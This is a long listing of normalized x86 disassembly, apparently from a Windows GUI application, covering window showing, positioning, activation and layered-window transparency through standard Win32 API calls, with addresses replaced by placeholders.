push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4548b8
jmp r-xdata
sub_456519
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45a284
call sub_40390c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_457cf4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439d50
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_457ce8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439d94
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_457d24
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439d50
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_457cf4
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4569b0
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43a5ac
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_457d18
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_439d94
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_457ce8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_4548b8
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_4548b8
jmp r-xdata
sub_4568b5
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45a284
call sub_40390c
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_455608
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43e080
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_440b28
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4569b0
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_440b28
call sub_45126c
mov ebx eax
sub_4569fc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_456a54
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ca54
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456ab2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403104
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_456ac0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403300
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_456aec
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45a270
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403300
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_456c8c
jmp r-xdata
mov eax ebx
call sub_456d28
mov dl 0x1
mov eax ebx
call sub_454878
jmp r-xdata
sub_456b90
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_454204
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_454250
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_456bf4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456c60
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403300
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_456d28
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_456cac
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_456d1a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456d21
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_455504
sub_456d44
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45700c
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_438bac
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_4591e4
xor edx edx
push ebp
push sub_456fef
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_413de8
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_458214
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_45111c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_456fcd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_456c94
xor edx edx
push ebp
push sub_456f2c
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_456bf4
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_459ff0
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_440b28
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456f33
mov eax [ ebp - 0x4 ]
call sub_456c8c
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_456f33
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456fd7
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_458214
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_458214
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_413d64
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_413eb0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4511d0
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45701c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43d858
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45701c
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43d81c
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45708c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45701c
pop ecx
mov eax [ esi + 0x34 ]
call sub_44c574
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_44c584
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_457110
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ee78
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403300
sub_457134
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403300
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_457164
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43d858
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_457134
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_457164
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43d81c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4571e0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_457134
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_457134
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_457164
pop ecx
test al al
je r-xdata
sub_457234
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403300
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_457264
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_43d858
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_457234
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_457264
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43d81c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4572e0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_457234
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_457234
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_457264
pop ecx
test al al
je r-xdata
sub_457334
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_413d6c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_446704
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_457388
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_457334
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403300
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457404
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_419fe4
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_457440
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_43a830
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_43b4f4
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_457488
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_440e2c
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_440b28
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_440b28
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_440b28
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_440b28
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_440b28
push eax
call RedrawWindow
sub_4575dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_45238c
mov dl 0x5
mov eax ebx
call sub_454100
mov dl 0x1
mov eax ebx
call sub_43f704
mov dl 0x3
mov eax ebx
call sub_4543fc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_457644
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45771b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43f5c4
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43f430
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_439860
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a2c0
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_403f44
mov eax [ ebp - 0xc ]
call sub_404114
push eax
mov eax [ ebp - 0xc ]
call sub_404314
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_43a2d0
mov eax [ ebp - 0xc ]
call sub_404114
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457722
lea eax [ ebp - 0xc ]
call sub_403e54
retn
mov dl 0x1
mov eax esi
call sub_453780
mov edx [ ebp - 0xc ]
mov eax esi
call sub_43a37c
mov ebx 0x1
